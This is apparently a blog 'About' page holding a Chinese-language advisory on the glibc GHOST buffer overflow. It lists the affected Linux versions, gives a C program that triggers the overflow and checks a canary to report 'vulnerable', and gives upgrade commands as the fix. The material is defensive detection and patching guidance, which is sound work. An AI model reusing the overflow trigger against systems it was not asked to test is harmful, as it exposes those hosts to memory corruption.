---
layout: page
title: About
permalink: /about/
---
Test

glibc是GNU发布的libc库，即c运行库，在glibc库中的__nss_hostname_digits_dots()函数存在一个缓冲区溢出的漏洞，这个漏洞可以经过gethostbyname*()函数被本地或者远程触发，攻击者可以利用该漏洞执行指令，控制存在漏洞的系统。发现者以“幽灵”(GHOST)命名此漏洞。

1、漏洞影响范围
此漏洞影响使用GNU libc库版本2.2-2.17的Linux操作系统，受影响的操作系统包括：

CentOS 6 & 7

Debian 7

Red Hat Enterprise Linux 6 & 7

Ubuntu 10.04 & 12.04

各Linux发行版 


2、漏洞验证方法
将附件漏洞验证代码代码保存成 ghost.c 文件并且上传到要验证的linux主机中。 使用 “gcc ghost.c –o testghost”指令编译，会生成testghost。 使用 ./testghost 执行漏洞测试程序，如果程序输出vulnerable则说明存在漏洞。 


3、漏洞修复方法
 执行GNU libc升级命令，将linux中的libc 升级到最新版本，另外在升级完libc后需要重启系统。

     1）针对 RH、Fedora、CentOS系统

 执行 yum install glibc && reboot 更新GNU  libc

     2）针对 Debian、Ubuntu系统

 执行 apt-get clean && apt-get update && apt-get upgrade 更新GNU  libc

附件：漏洞验证代码
```c  
#include <netdb.h>

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <errno.h>

 #define CANARY "in_the_coal_mine"

struct {

  char buffer[1024];

  char canary[sizeof(CANARY)];

} temp = { "buffer", CANARY };

int main(void) {

  struct hostent resbuf;

  struct hostent *result;

  int herrno;

  int retval;

  /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/

  size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;

  char name[sizeof(temp.buffer)];

  memset(name, '0', len);

  name[len] = '\0';

  retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);

  if (strcmp(temp.canary, CANARY) != 0) {

    puts("vulnerable");

    exit(EXIT_SUCCESS);

  }

  if (retval == ERANGE) {

    puts("not vulnerable");

    exit(EXIT_SUCCESS);

  }

  puts("should not happen");

  exit(EXIT_FAILURE);

}
```
